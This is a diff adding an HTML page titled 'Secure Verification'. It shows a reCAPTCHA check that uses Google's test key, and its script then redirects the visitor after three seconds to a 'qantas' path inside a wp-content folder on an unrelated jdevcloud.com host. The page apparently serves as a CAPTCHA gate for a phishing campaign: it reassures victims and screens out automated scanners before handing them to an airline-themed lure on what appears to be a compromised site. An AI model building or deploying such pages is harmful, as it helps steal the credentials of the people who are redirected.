@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enhanced reCAPTCHA v2 Verification</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  <style>
+    :root {
+      --primary-color: #4285F4;
+      --accent-color: #34A853;
+      --error-color: #EA4335;
+      --background-light: #f8f9fa;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --border-radius: 8px;
+      --box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      --transition-all: all 0.3s ease;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: var(--background-light);
+      color: var(--text-primary);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: white;
+      border-radius: var(--border-radius);
+      box-shadow: var(--box-shadow);
+      overflow: hidden;
+      transition: var(--transition-all);
+    }
+
+    .header {
+      padding: 24px;
+      background: var(--primary-color);
+      text-align: center;
+      color: white;
+    }
+
+    .header h1 {
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .content {
+      padding: 32px;
+    }
+
+    .recaptcha-container {
+      margin: 24px 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 14px 0;
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      border-radius: var(--border-radius);
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: var(--transition-all);
+    }
+
+    .submit-btn:hover {
+      background-color: #3367d6;
+    }
+
+    .submit-btn:disabled {
+      background-color: #c0c0c0;
+      cursor: not-allowed;
+    }
+
+    .error-message {
+      color: var(--error-color);
+      font-size: 14px;
+      margin-top: 8px;
+      display: none;
+      text-align: center;
+    }
+
+    .success-message {
+      display: none;
+      padding: 20px;
+      background-color: rgba(52, 168, 83, 0.1);
+      border: 1px solid rgba(52, 168, 83, 0.3);
+      border-radius: var(--border-radius);
+      color: var(--accent-color);
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 40px;
+      padding: 20px;
+      color: var(--text-secondary);
+      font-size: 14px;
+    }
+
+    .footer a {
+      color: var(--primary-color);
+      text-decoration: none;
+    }
+
+    @media (max-width: 640px) {
+      .container {
+        margin: 20px auto;
+      }
+
+      .content {
+        padding: 24px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Secure Verification</h1>
+    </div>
+
+    <div class="content">
+      <div class="success-message" id="successMsg">
+        <p>Verification successful! You may proceed.</p>
+      </div>
+
+      <form id="verificationForm">
+        <div class="recaptcha-container">
+          <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
+        </div>
+        <div class="error-message" id="errorMsg">Please verify that you are not a robot.</div>
+        <button type="submit" class="submit-btn" id="submitBtn">Click to Redirect</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>© 2025 Secure Verification System. All rights reserved.</p>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('verificationForm');
+      const errorMsg = document.getElementById('errorMsg');
+      const successMsg = document.getElementById('successMsg');
+      const submitBtn = document.getElementById('submitBtn');
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const response = grecaptcha.getResponse();
+        if (!response) {
+          errorMsg.style.display = 'block';
+          return;
+        }
+
+        errorMsg.style.display = 'none';
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Redirecting in 3 seconds...';
+
+        successMsg.style.display = 'block';
+
+        setTimeout(() => {
+          window.location.href = "https://sosargd.jdevcloud.com/wp-content/1/qantas";
+        }, 3000);
+      });
+    });
+  </script>
+</body>
+</html>
